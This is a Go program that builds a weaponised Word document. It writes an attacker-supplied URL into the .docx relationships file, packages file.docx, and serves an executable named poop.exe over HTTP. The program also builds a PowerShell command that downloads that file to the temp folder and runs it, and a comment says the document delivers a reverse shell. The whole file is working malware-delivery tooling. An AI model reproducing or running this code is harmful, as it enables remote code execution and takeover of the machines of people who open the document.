package main

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
)

func main() {
	url, port := initArgs()
	payload_url := "http://" + url + ":" + port + "/poop.exe"
	payload := "Invoke-WebRequest " + payload_url + " -OutFile $env:temp\\poop.exe; $env:temp\\poop.exe"
	sEnc := base64.StdEncoding.EncodeToString([]byte(payload))
	// La faut rajouter le payload dans le doc pour qu'il dl le reverse shell et l'execute via payload ci dessus
	fileByte, _ := os.ReadFile("doc/word/_rels/document.xml.rels")
	fileByte = bytes.ReplaceAll(fileByte, []byte("{payload_url}"), []byte(payload_url))
	os.WriteFile("src/docx/word/_rels/document.xml.rels", fileByte, 0644)
	zipDoc()
	hostDropper(port)
}

func initArgs() (string, string) {
	url := flag.String("url", "localhost", "The hostname or IP address where the generated document should retrieve your payload, defaults to \"localhost\".")
	port := flag.String("port", "80", "The port to run the HTTP server on, defaults to 80")
	flag.Parse()
	return *url, *port
}

func zipDoc() {
	baseFolder := "src/docx/"
	outFile, _ := os.Create(`file.docx`)
	defer outFile.Close()
	writer := zip.NewWriter(outFile)
	addFiles(writer, baseFolder, "")
	writer.Close()
}

func addFiles(w *zip.Writer, basePath, baseInZip string) {
	// Open the Directory
	files, err := ioutil.ReadDir(basePath)
	if err != nil {
		fmt.Println(err)
	}
	for _, file := range files {
		fmt.Println(basePath + file.Name())
		if !file.IsDir() {
			dat, err := ioutil.ReadFile(basePath + file.Name())
			if err != nil {
				fmt.Println(err)
			}
			// Add some files to the archive.
			f, err := w.Create(baseInZip + file.Name())
			if err != nil {
				fmt.Println(err)
			}
			_, err = f.Write(dat)
			if err != nil {
				fmt.Println(err)
			}
		} else if file.IsDir() {
			// Recurse
			newBase := basePath + file.Name() + "/"
			fmt.Println("Recursing and Adding SubDir: " + file.Name())
			fmt.Println("Recursing and Adding SubDir: " + newBase)

			addFiles(w, newBase, baseInZip+file.Name()+"/")
		}
	}
}

func hostDropper(port string) {
	http.HandleFunc("/poop.exe", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "poop.exe")
	})
	http.ListenAndServe(":"+port, nil)
}
